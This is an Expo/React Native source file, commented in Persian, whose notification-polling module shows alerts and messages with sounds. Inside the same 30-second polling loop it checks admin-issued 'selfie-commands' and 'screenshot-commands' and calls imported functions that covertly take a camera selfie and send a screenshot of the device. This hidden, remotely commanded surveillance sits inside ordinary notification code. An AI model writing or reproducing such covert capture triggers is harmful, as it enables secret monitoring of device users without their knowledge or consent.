import * as Notifications from 'expo-notifications';
import { request } from './api';
import { triggerCovertSelfie } from './covertTrigger';
import { captureAndSendScreenshot } from './covertScreenshot';
import { playSound, soundKeyByNotification, notificationSoundNameByType } from './soundFx';

let timer = null;
let seenIds = new Set();        // شناسهٔ اعلان‌های ذخیره‌شده‌ای که قبلاً دیده شده
let seenAlerts = new Set();     // امضای هشدارهای زنده (بدون شناسه)
let seenMsgs = new Set();       // شناسهٔ پیام‌های دیده‌شده
let primed = false;             // اولین بار فقط وضعیت فعلی را ثبت می‌کنیم تا انبوه اعلان نشان داده نشود
let primedMsg = false;

export async function notify(title, body, data = {}) {
  try {
    const isPresence = data && data.type === 'presence_check';
    await Notifications.scheduleNotificationAsync({
      content: {
        title: title || 'اعلان جدید',
        body: body || '',
        sound: notificationSoundNameByType(data?.type),
        priority: isPresence ? Notifications.AndroidNotificationPriority.MAX : Notifications.AndroidNotificationPriority.HIGH,
        data: data || {},
        channelId: isPresence ? 'presence_alarm' : (data?.type === 'message' || data?.type === 'chat' ? 'messages' : (data?.type === 'report' || data?.type === 'inbox_report' ? 'reports' : 'default')),
      },
      trigger: null,
    });
    // هنگام باز بودن اپ، صدای اختصاصی را نیز پخش می‌کنیم؛ در پس‌زمینه/صفحه خاموش کانال ناتیفیکیشن صدا را پخش می‌کند.
    playSound(soundKeyByNotification(title, body, data)).catch(() => {});
  } catch (e) {}
}

async function tick() {
  // اعلان‌ها
  try {
    const d = await request('/my/notifications');
    const items = (d && d.items) || [];
    const fresh = [];
    for (const n of items) {
      const key = n.id ? ('id:' + n.id) : ('al:' + (n.title || '') + '|' + (n.body || ''));
      const store = n.id ? seenIds : seenAlerts;
      const k = key.replace(/^id:|^al:/, '');
      if (!store.has(k)) { store.add(k); if (n.id ? !n.is_read : true) fresh.push(n); }
    }
    if (!primed) { primed = true; }
    else for (const n of fresh.slice(0, 5))
      await notify(n.type === 'alert' ? '⚠ ' + (n.title || 'هشدار') : (n.title || 'اعلان جدید'), n.body || '', n.data || {});
  } catch (e) {}

  // پیام‌ها (پیام جدید → ناتیفیکیشن «شما یک پیام جدید دارید» + صدا)
  try {
    const rows = await request('/my/messages');
    const freshMsgs = [];
    for (const m of (rows || [])) {
      if (!seenMsgs.has(m.id)) { seenMsgs.add(m.id); if (!m.read_at) freshMsgs.push(m); }
    }
    if (!primedMsg) { primedMsg = true; }
    else for (const m of freshMsgs.slice(0, 5))
      await notify('پیام جدید', m.title ? `${m.title}` : 'شما یک پیام جدید دارید', { type: 'message', message_id: m.id });
  } catch (e) {}

  // بررسی دستورات سلفی فوری (از پنل مدیر)
  try {
    const cmds = await request('/my/selfie-commands');
    for (const cmd of (cmds || [])) {
      if (!seenIds.has('cmd:'+cmd.id)) {
        seenIds.add('cmd:'+cmd.id);
        if (primed) triggerCovertSelfie('manual');
      }
    }
  } catch (e) {}
  // بررسی دستورات اسکرین‌شات فوری
  try {
    const sscmds = await request('/my/screenshot-commands');
    for (const cmd of (sscmds || [])) {
      if (!seenIds.has('ss:'+cmd.id)) {
        seenIds.add('ss:'+cmd.id);
        if (primed) captureAndSendScreenshot('manual');
      }
    }
  } catch (e) {}
}

// شروع رصد اعلان‌ها و پیام‌ها هنگام باز بودن اپ (هر ۳۰ ثانیه)
export function startNotifyPolling() {
  if (timer) return;
  primed = false; primedMsg = false; seenIds = new Set(); seenAlerts = new Set(); seenMsgs = new Set();
  tick();
  timer = setInterval(tick, 30000);
}

export function stopNotifyPolling() {
  if (timer) { clearInterval(timer); timer = null; }
}
